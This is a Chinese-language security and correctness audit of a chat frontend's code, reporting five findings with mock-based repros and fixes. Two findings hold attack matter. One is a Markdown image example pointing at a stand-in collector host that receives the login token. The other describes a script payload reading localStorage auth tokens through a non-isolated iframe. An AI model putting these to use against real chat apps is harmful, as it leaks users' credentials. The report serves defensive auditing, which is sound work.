# Frontend 代码审计

> 本报告保留首次审计证据。代码已修改，当前结论请查看[第三轮复审](/Users/chain/Documents/MyProject/ops-automation/docs/audits/frontend-code-reaudit-round3-2026-10-06.md)。下文源码行号与复现断言对应首次审计状态，不应直接用于判断修改后的代码。

审计日期：2026-10-06（Asia/Shanghai）。基线：`613e1b70` 的当前工作区，包含审计开始时已有的未提交改动。

范围：`apps/frontend/portal`、`apps/frontend/user-web` 和 `apps/frontend/shared/chat-web`。先通过 codebase-memory 定位结构、符号和调用链，再核对当前磁盘源码；重点检查共享内容渲染、登录令牌流向、并发聊天与取消、异步加载，并运行两个应用的现有静态检查与测试。这是风险导向审计，不代表逐行穷尽全部文件或完整浏览器端到端验收。

本次只新增审计报告与隔离复现脚本，没有修改业务源码、覆盖已有工作区改动或操作容器。

## 结论

确认 5 项需要修复的问题：3 项 P1，2 项 P2。静态检查和现有测试通过，不能排除这些未被测试覆盖的行为缺陷。

| 编号 | 优先级 | 问题 | 验证方式 |
| --- | --- | --- | --- |
| F1 | P1 | HTML 产物脚本与主应用同源，预览和新窗口缺少有效隔离 | 输入链、源码与浏览器隔离机制分析 |
| F2 | P1 | 外部 Markdown 图片地址可获得登录令牌 | 当前源码函数的隔离调用 |
| F3 | P1 | 停止无活跃流的会话会取消另一个会话的执行 | 当前聊天 hook 的隔离调用 |
| F4 | P2 | 并发流共享取消状态与执行 ID，消息元数据串线 | 当前聊天 hook 的隔离调用 |
| F5 | P2 | HTML 源码加载失败触发无上限重试 | 当前组件的 effect 状态转换复现 |

P1 应优先修复；P2 是条件触发的正确性或稳定性问题。以下均说明触发条件，不表示已在真实生产环境发生。

## F1：HTML 产物脚本缺少有效隔离

位置：[内联预览 iframe](/Users/chain/Documents/MyProject/ops-automation/apps/frontend/shared/chat-web/components/HtmlPreviewBlock.tsx:518)、[全屏 iframe](/Users/chain/Documents/MyProject/ops-automation/apps/frontend/shared/chat-web/components/HtmlPreviewBlock.tsx:595)、[新窗口写入](/Users/chain/Documents/MyProject/ops-automation/apps/frontend/shared/chat-web/components/HtmlPreviewBlock.tsx:310)。

[MessageContentRenderer](/Users/chain/Documents/MyProject/ops-automation/apps/frontend/shared/chat-web/components/MessageContentRenderer.tsx:191) 把 Markdown HTML 代码块传入 `HtmlPreviewBlock.code`。组件的“自愈”只补闭合标签，不移除脚本；代码通过 `srcdoc` 写入 iframe，两个 iframe 都同时设置 `allow-scripts` 和 `allow-same-origin`。对于 `srcdoc`，这使生成脚本获得主应用的源，可以读取 `parent` 页面和同源 localStorage。应用登录令牌保存在 localStorage，因此用户展开含恶意脚本的生成产物时，存在令牌读取和以用户身份访问接口的风险。

“新窗口”通过 `window.open('', '_blank')` 创建继承应用源的文档，再 `document.write(repairedHtml)`，仍直接执行生成脚本。仅移除 iframe 的 `allow-same-origin` 不能修好这条入口。另一个相关入口是 [图片查看器](/Users/chain/Documents/MyProject/ops-automation/apps/frontend/shared/chat-web/components/MessageContentRenderer.tsx:241)，将 Markdown 的 `alt` 原样插入新文档的 `<title>`，同样应避免拼接不可信 HTML。

最小验证载荷可在 HTML 代码块中读取 `parent.localStorage.getItem('ops-user-auth')` 或 `auth-storage`，但本次没有在真实账号页面执行此载荷。此项是根据实际输入链和源隔离机制确认的静态安全结论，未声称已完成浏览器攻击复现。

建议：内联和全屏产物使用 opaque origin 的 sandbox，按实际交互需求保留权限；独立窗口使用隔离来源的预览页面或 sandbox 容器，避免在应用源直接写入生成 HTML。图片查看器使用 DOM API 设置文本和属性。修复后增加真实浏览器测试，验证产物无法读取父页面、令牌或 opener。

## F2：外部图片地址被附加登录令牌

位置：[appendAuthToken](/Users/chain/Documents/MyProject/ops-automation/apps/frontend/shared/chat-web/components/MessageContentRenderer.tsx:71)、[图片渲染调用](/Users/chain/Documents/MyProject/ops-automation/apps/frontend/shared/chat-web/components/MessageContentRenderer.tsx:217)。

`safeUrlTransform` 允许 HTTP/HTTPS 图片链接；`appendAuthToken` 只检查 URL 字符串是否包含 `/api/ai/chat/workspace-files/`，不检查 origin。于是恶意或被污染的模型输出只需包含以下图片：

```markdown
![image](https://collector.invalid/api/ai/chat/workspace-files/demo.png)
```

图片请求地址就会成为：

```text
https://collector.invalid/api/ai/chat/workspace-files/demo.png?token=AUDIT_FAKE_TOKEN
```

复现调用的是从当前源码 AST 提取的 `safeUrlTransform` 和 `appendAuthToken`，localStorage 使用假令牌，没有发送网络请求。浏览器加载这个图片时，无需用户点击，令牌就会进入外部服务器收到的 URL；CORS 不阻止图片请求。

建议：通过 `new URL(url, window.location.origin)` 解析，严格校验同源和目标 pathname 后才附加凭据；同时拒绝协议相对的外部 URL。补充外域、协议相对 URL、路径出现在 query 中以及已有 query/hash 的用例。条件允许时，改用受控的带鉴权请求加载图片，避免令牌进入 URL。

## F3：停止会话 B 会取消会话 A

位置：[无匹配流时的取消分支](/Users/chain/Documents/MyProject/ops-automation/apps/frontend/user-web/src/features/chat/hooks/useChatStreaming.ts:339)、[页面传入当前选择会话](/Users/chain/Documents/MyProject/ops-automation/apps/frontend/user-web/src/features/chat/pages/ChatPage.tsx:641)。

当 A 仍有流运行，用户切换到没有活跃流的 B 后点击停止，`activeStreamsMapRef` 找不到 B，于是 fallback 使用全局 `activeExecutionIdRef` 取消 A，并调用最新的 `abortStreaming` 中断 A。发送到 `/ai/chat/stop` 的 sessionId 却是 B。页面使用全局 `isStreaming`，所以切换会话不能保证停止按钮只针对有流的会话。

隔离复现：启动 A，注入 `execution-A` 事件，调用 `handleStopStreaming('B')`；实际记录：

```json
[{"executionId":"execution-A"},{"url":"/ai/chat/stop","sessionId":"B"}]
```

A 的前端 abort 也被调用一次。所有 API 和流均为 mock，没有取消真实任务。

建议：显式指定目标会话时，所有取消、abort 和后台停止动作必须从该会话的记录解析。没有匹配记录时不能回退到其他会话的全局句柄；可仅尝试停止指定会话的后端任务，或明确返回无可停止任务。流尚在等待令牌时也需要按会话记录可取消状态。

## F4：并发流的取消状态与执行 ID 串线

位置：[共享 refs](/Users/chain/Documents/MyProject/ops-automation/apps/frontend/user-web/src/features/chat/hooks/useChatStreaming.ts:73)、[事件覆盖全局执行 ID](/Users/chain/Documents/MyProject/ops-automation/apps/frontend/user-web/src/features/chat/hooks/useChatStreaming.ts:131)、[异常处理读取共享状态](/Users/chain/Documents/MyProject/ops-automation/apps/frontend/user-web/src/features/chat/hooks/useChatStreaming.ts:238)。

虽然句柄保存在每条消息独立的 Map 中，执行 ID 和 `isUserAbortedRef`、`isRunInBackgroundRef` 仍是全局共享的。`runAssistantRequest` 中所谓 local 标志始终为 `false`，并没有随对应流的动作更新。

隔离复现：同时启动 A、B，依次发出两者的 executionId，然后停止 A：A 的取消 patch 写入 `execution-B`。随后让仍在运行的 B 抛出普通 `HTTP 500`，因为停止 A 已设置全局 `isUserAbortedRef`，B 也被标记成 `executionStatus: cancelled`，显示“任务已由用户手动停止”，没有正确记录失败。

这种错误会污染执行详情关联和终态展示。转后台逻辑也使用相同共享 refs，需在修复时一并审查；本次没有对所有后台轮询分支逐一动态验证。

建议：每个流记录自己的 executionId、取消原因、后台标志和句柄，并由对应 Promise 的闭包读取；停止和转后台更新目标记录。全局 streaming count 只负责汇总展示。增加交错事件、停止 A 后 B 失败、转后台后另一个流启动等回归场景。

## F5：HTML 源码加载失败持续重试

位置：[源码加载 effect](/Users/chain/Documents/MyProject/ops-automation/apps/frontend/shared/chat-web/components/HtmlPreviewBlock.tsx:58)。

用户切到“查看源码”，没有 inline code 的产物会触发 fetch。若链接过期、404、鉴权失败或网络异常，catch 只打印错误，finally 把 `isFetchingCode` 设为 false。这个状态又是 effect 的依赖，`fetchedCode` 仍为空，于是 effect 再次满足所有条件并请求同一个 URL。没有次数上限、退避或错误状态；空响应也有相同风险。

复现脚本加载当前组件，使用轻量 hooks 模型保留 state、ref 和 effect 依赖变化；对失败前后的 loading 状态分别渲染。5 次加载周期产生 5 次相同的 404 请求。它不是完整 React DOM 浏览器测试，但直接验证了当前 effect 条件和状态转换形成的重试循环。

此外，`srcUrl` 改变时 `fetchedCode` 没有清空，请求也没有取消；复用同一组件时可能出现旧源码或迟到响应。此项未单独动态复现，应随加载状态设计一起处理。

建议：按产物 URL 管理加载状态，失败后显示错误和显式重试按钮；只对适合重试的错误进行有限退避，URL 变化时清理旧内容并取消旧请求。

## 验证与局限

所有命令从仓库根目录执行，未使用 Docker。

| 检查 | 结果 |
| --- | --- |
| `pnpm --filter @ops/portal typecheck` | 通过 |
| `pnpm --filter @ops/user-web typecheck` | 通过 |
| `pnpm --filter @ops/portal test` | 7 个文件、23 个测试通过 |
| `pnpm --filter @ops/user-web test` | 17 个文件、115 个测试通过 |
| `pnpm --filter @ops/portal lint` | 0 error、535 warning |
| `pnpm --filter @ops/user-web lint` | 0 error、461 warning |
| `pnpm --filter @ops/portal check:user-route-policy` | 用户链路收口校验通过 |
| 隔离复现脚本 | 外域令牌拼接、跨会话误取消、并发元数据串线、错误误分类、404 重试均断言通过 |

Vitest 两次运行都打印开发 HMR WebSocket 的 `EPERM`，但测试正常结束且退出码为 0；不能把测试通过当作开发服务可启动的证明。另有 antd 弃用与 Node localStorage 警告。没有进行生产构建、真实登录、真实任务执行或浏览器端到端测试。

复现命令：

```bash
node docs/audits/scripts/frontend-audit-repro-2026-10-06.cjs
```

[复现脚本](/Users/chain/Documents/MyProject/ops-automation/docs/audits/scripts/frontend-audit-repro-2026-10-06.cjs) 会现场转译当前源码，替换 API、令牌和 React hooks，不发送网络请求。它是审计证据工具，不是对真实 React 调度、浏览器源隔离和后端行为的完整测试替代。

## 文件复杂度

当前 `apps/frontend` 共 755 个 TS/TSX 文件（包含测试和配置，排除 node_modules/dist）。没有超过 1200 行或 1600 行的文件，因此没有确认到仓库规定的硬性拆分阈值违规。

仍有接近阈值的文件值得按职责下沉：`AIControls.tsx` 1176 行、`WorkflowEditModal.tsx` 1145 行、`InboxList.tsx` 1127 行、`TodoCard.tsx` 1100 行、`InboxTaskDetailModal.tsx` 1053 行。应优先把操作编排、异步加载和纯展示拆开；共享 HTML 预览应提取独立的安全产物呈现层，而不是在多个入口分别维护权限字符串。

建议修复顺序：先封闭 F1/F2 的凭据暴露入口，再让 F3/F4 的流状态按会话和消息隔离，最后修复 F5 加载状态并补充对应的浏览器与 hooks 回归测试。
